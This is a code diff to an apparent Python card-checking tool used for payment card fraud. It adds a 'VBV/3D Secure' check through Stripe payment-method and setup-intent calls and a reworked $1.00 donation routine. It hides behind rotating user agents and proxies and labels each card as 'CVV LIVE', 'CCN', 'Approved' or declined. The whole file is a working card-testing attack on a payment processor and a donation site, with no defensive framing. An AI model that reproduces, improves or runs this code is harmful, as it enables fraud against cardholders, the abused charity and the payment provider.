@@ -1,16 +1,108 @@
 import requests
 import random
 import json
+import time
 from config import *
 from utils import load_config, generate_identifier
+
+def vbv_check(card, cc_no, month, year, cvv):
+    """Enhanced VBV/3D Secure check"""
+    config = load_config()
+    user_agent = random.choice(USER_AGENTS)
+    
+    # VBV check endpoints
+    vbv_endpoints = [
+        "https://api.stripe.com/v1/setup_intents",
+        "https://api.stripe.com/v1/payment_intents",
+    ]
+    
+    proxies = None
+    if config.get('proxy_host'):
+        if config.get('proxy_username'):
+            proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
+        else:
+            proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
+        proxies = {'http': proxy_url, 'https': proxy_url}
+    
+    for endpoint in vbv_endpoints:
+        try:
+            # Create payment method first
+            pm_data = {
+                'type': 'card',
+                'card': {
+                    'number': cc_no,
+                    'exp_month': month,
+                    'exp_year': year,
+                    'cvc': cvv
+                }
+            }
+            
+            pm_response = requests.post(
+                "https://api.stripe.com/v1/payment_methods",
+                data=pm_data,
+                headers={'User-Agent': user_agent},
+                proxies=proxies,
+                timeout=15
+            )
+            
+            if pm_response.status_code == 200:
+                pm_data = pm_response.json()
+                if 'id' in pm_data:
+                    # Try to create setup intent for VBV check
+                    si_data = {
+                        'payment_method': pm_data['id'],
+                        'payment_method_types[]': 'card',
+                        'usage': 'off_session'
+                    }
+                    
+                    si_response = requests.post(
+                        "https://api.stripe.com/v1/setup_intents",
+                        data=si_data,
+                        headers={'User-Agent': user_agent},
+                        proxies=proxies,
+                        timeout=15
+                    )
+                    
+                    if si_response.status_code == 200:
+                        si_data = si_response.json()
+                        
+                        # Analyze response for VBV indicators
+                        if si_data.get('status') == 'requires_action':
+                            return {
+                                'vbv_status': 'VBV_REQUIRED',
+                                'message': '3D Secure Authentication Required',
+                                'next_action': si_data.get('next_action', {})
+                            }
+                        elif si_data.get('status') == 'succeeded':
+                            return {
+                                'vbv_status': 'VBV_BYPASSED',
+                                'message': 'VBV Check Bypassed',
+                                'setup_intent': si_data['id']
+                            }
+                        else:
+                            return {
+                                'vbv_status': 'VBV_UNKNOWN',
+                                'message': 'VBV Status Unknown',
+                                'status': si_data.get('status', 'unknown')
+                            }
+            
+        except Exception as e:
+            continue
+    
+    return {
+        'vbv_status': 'VBV_ERROR',
+        'message': 'VBV Check Failed'
+    }
 
 def payment(card, cc_no, month, year, cvv):
     config = load_config()
     user_agent = random.choice(USER_AGENTS)
     
-    # Check expiration
     if (len(year) == 2 and int(year) < 24) or (len(year) != 2 and int(year) < 2024):
         return [False, "Expired Card"]
+    
+    # Perform VBV check first
+    vbv_result = vbv_check(card, cc_no, month, year, cvv)
     
     data = {
         'type': 'card',
@@ -36,10 +128,7 @@ def payment(card, cc_no, month, year, cvv):
             proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
         else:
             proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
-        proxies = {
-            'http': proxy_url,
-            'https': proxy_url
-        }
+        proxies = {'http': proxy_url, 'https': proxy_url}
     
     try:
         response = requests.post(
@@ -52,14 +141,14 @@ def payment(card, cc_no, month, year, cvv):
         
         response_data = response.json()
         if 'id' in response_data:
-            return [True, response_data['id']]
+            return [True, response_data['id'], vbv_result]
         else:
-            return [False, "Invalid Payment Method"]
+            return [False, "Invalid Payment Method", vbv_result]
             
     except Exception as e:
-        return [False, f"Request Error: {str(e)}"]
+        return [False, f"Request Error: {str(e)}", vbv_result]
 
-def donate(card, payment_id, name, email):
+def enhanced_donate(card, payment_id, name, email, vbv_result=None):
     config = load_config()
     user_agent = random.choice(USER_AGENTS)
     
@@ -71,10 +160,7 @@ def donate(card, payment_id, name, email):
             proxy_url = f"http://{config['proxy_username']}:{config['proxy_password']}@{config['proxy_host']}:{config['proxy_port']}"
         else:
             proxy_url = f"http://{config['proxy_host']}:{config['proxy_port']}"
-        proxies = {
-            'http': proxy_url,
-            'https': proxy_url
-        }
+        proxies = {'http': proxy_url, 'https': proxy_url}
     
     try:
         response = requests.post(
@@ -92,22 +178,40 @@ def donate(card, payment_id, name, email):
         
         response_data = response.json()
         
+        # Determine VBV status for response
+        vbv_status = "VBV - "
+        if vbv_result and vbv_result.get('vbv_status') == 'VBV_REQUIRED':
+            vbv_status += "3D Secure Required"
+        elif vbv_result and vbv_result.get('vbv_status') == 'VBV_BYPASSED':
+            vbv_status += "Bypassed"
+        else:
+            vbv_status += "Checked"
+        
         if 'errors' in response_data:
-            if 'insufficient funds' in response_data['errors']:
-                return [True, "insufficient", "Insufficient Funds"]
+            error_msg = response_data['errors']
+            
+            if 'insufficient funds' in error_msg.lower():
+                return [True, "ccn", "Insufficient funds", "You Balance Is Lower Than $1.00", "($1.00)", vbv_status]
+            elif 'security code' in error_msg.lower() or 'cvv' in error_msg.lower():
+                return [True, "ccn", "CCN", "Security Code Is Wrong for $1.00", "($1.00)", vbv_status]
+            elif 'purchase' in error_msg.lower() or 'type' in error_msg.lower():
+                return [True, "ccn", "CVV", "You Can't Purchase This Type for $1.00", "($1.00)", vbv_status]
+            elif 'declined' in error_msg.lower():
+                return [False, "declined", "Card Declined", "Your card was declined for $1.00", "($1.00)", vbv_status]
             else:
-                return [False, response_data['errors']]
+                return [False, "failed", error_msg, f"{error_msg} for $1.00", "($1.00)", vbv_status]
+                
         elif response_data.get('success'):
             message = response_data.get('data', {}).get('message', '')
             if 'Verifying strong customer authentication' in message:
-                return [True, "live", "CVV LIVE (3D Secure)"]
+                return [True, "live", "CVV LIVE", "3D Secure Required for $1.00", "($1.00)", "VBV - 3D Secure Required"]
             else:
-                return [True, "live", "Card Approved"]
+                return [True, "live", "Approved", "Approved $1.00", "($1.00)", vbv_status]
                 
-        return [False, "Unknown error"]
+        return [False, "unknown", "Unknown error", "Unknown error for $1.00", "($1.00)", vbv_status]
         
     except Exception as e:
-        return [False, f"Proxy Error: {str(e)}"]
+        return [False, "error", f"Proxy Error: {str(e)}", f"Proxy Error for $1.00", "($1.00)", "VBV - Error"]
 
 def random_user_info():
     try:
